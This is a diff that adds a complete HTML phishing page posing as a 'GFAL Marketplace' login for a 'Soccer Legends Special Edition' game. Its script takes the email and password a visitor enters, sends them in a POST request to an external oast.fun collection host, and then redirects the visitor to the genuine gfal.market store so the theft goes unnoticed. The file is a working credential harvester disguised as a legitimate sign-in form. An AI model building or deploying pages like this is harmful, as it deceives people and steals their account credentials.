@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GFAL Marketplace</title>
+  <link rel="icon" type="image/x-icon" href="https://gfal.market/favicon.ico">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background-image: url('https://i.ibb.co/ysSQDy1/backgroundimage.png');
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+    }
+
+    .login-container {
+      background-color: rgba(255, 255, 255, 0.8);
+      border: solid 1px rgb(229, 231, 235);
+      border-radius: 5px;
+      width: 400px;
+      padding: 24px;
+      box-sizing: border-box;
+      position: relative;
+      top: 0.5in;
+      left: -3.7in;
+    }
+
+    .input-container {
+      margin-bottom: 16px;
+    }
+
+    .input-container label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .input-container input {
+      width: 100%;
+      padding: 8px;
+      border: none;
+      border-bottom: solid 1px rgb(229, 231, 235);
+      box-sizing: border-box;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: rgb(235, 30, 151);
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #FF6EC7;
+    }
+
+    .login-text {
+      text-align: center;
+      position: absolute;
+      top: 50px;
+      left: 0;
+      right: 0;
+      font-size: 24px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-text">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="text-align: center;">
+      <b>Login to play the<br>
+       Soccer Legends Special Edition</b>
+    </div>
+  </div>
+  <div class="login-container">
+    <form id="loginForm" action="#">
+      <div class="input-container">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+      <div class="input-container">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <button type="submit" class="login-btn" id="loginButton">Login</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      // Prevent the default form submission behavior
+      event.preventDefault();
+
+      // Get the values entered by the user
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('password').value;
+
+      // Log the email and password
+      console.log("Email:", email);
+      console.log("Password:", password);
+
+      // Send the email and password to Interactsh
+      fetch('https://pxanqaylxtwvwrzocclzqwwbdu9ps89pz.oast.fun', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email: email, password: password })
+      })
+      .then(response => {
+        // Redirect the user to the specified link
+        window.location.href = 'https://gfal.market/store/elemental-raiders';
+      })
+      .catch(error => console.error('Error:', error));
+    });
+  </script>
+</body>
+</html>
